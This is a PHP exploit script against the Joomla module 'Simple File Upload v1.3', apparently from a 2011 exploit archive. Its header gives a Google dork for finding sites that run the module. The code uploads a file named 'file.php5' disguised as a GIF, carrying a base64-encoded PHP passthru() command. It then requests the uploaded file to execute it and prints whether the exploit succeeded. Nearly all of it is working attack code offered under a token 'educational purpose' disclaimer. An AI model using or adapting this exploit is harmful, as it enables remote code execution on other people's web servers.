<?PHP
 
/*
    --------------------------------------------------------------------------------
    Title: Simple File Upload v1.3 (module for joomla) Remote Code Execution Exploit
    --------------------------------------------------------------------------------
      
    Author...............: gmda
    Google Dork..........:"Simple File Upload v1.3" "Powered by Joomla"
    Mail.................: gmda[at]email[dot]it
    Site.................: http://www.gmda.altervista.org/
    Date.................: 26/12/2011
    Software Link: http://wasen.net/downloads/mod_simpleFileUpload.1.3.zip
    Version: 1.3
    Tested on: winxp php version 5.3.2  Apache 2.0
     
    *the setup of the module is no captcha other setups are the default*
      
    +-------------------------------------------------------------------------+
    | This proof of concept code was written for educational purpose only.    |
    | Use it at your own risk. Author will be not responsible for any damage. |
    +-------------------------------------------------------------------------+
     
     
     
    The vulnerability is closed to transmit malformed packets to the server that he still plays and saves in his belly.
    This thing can be a bad intent to send commands to the server running clearly causing safety problems ........
    The script has peroblemi upload quality control .....
   
   
*/
 
 
$host="127.0.0.1";
$port=80;
$shell="R0lGOC8qLyo8P3BocCBwYXNzdGhydSgnY2FsYycpPz4vKg==";
$ContentType="image/gif";
$post="POST http://$host/Joomla_1.5.23_ita-Stable_test_expl/index.php";
$fp = fsockopen($host, $port, $errno, $errstr, 30);
$filename="file.php5";
 
 
 
 
 
 
 
 
if(!$fp) die($errstr.$errno); else {
 
 
 
 
 
                $data="-----------------------------41184676334\r\n";
                $data.="Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n";
                $data.="\r\n";
                $data.="100000\r\n-----------------------------41184676334\r\n";
                $data.="Content-Disposition: form-data;name=\"sfuFormFields44\"\r\n";
                $data.="\r\n\r\n";
                $data.="-----------------------------41184676334\r\n";
                $data.="Content-Disposition:form-data; name=\"uploadedfile44[]\"; filename=\"file.php5\"\r\nContent-Type: image/gif\r\n\r\n";
                $data.=base64_decode($shell)."\r\n";
                $data.="-----------------------------41184676334--\r\n";
 
 
                 
 
                $packet="$post HTTP/1.1\r\n";
                $packet.="Host: ".$host.":".$port."\r\n";
                $packet.="Content-Type: multipart/form-data; boundary=---------------------------41184676334\r\n";
                $packet.="Content-Length: ".strlen($data)."\r\n";
                $packet.="Connection: Close\r\n\r\n";
                $packet.=$data;
 
 
 
                 
fwrite($fp, $packet);
    fclose($fp);
     
     
 
     
}
 
          
 
                  
          
    $h = @fopen("http://".$host."/Joomla_1.5.23_ita-Stable_test_expl/images/file.php5", "r");
      if ($h) {
            while (($buf = fgets($h, 4096)) !== false) {
             echo $buf;
             echo("exploit was successful");
   }
    
    fclose($h);
    }else{
     echo("Error: exploit fail");
   }
?>

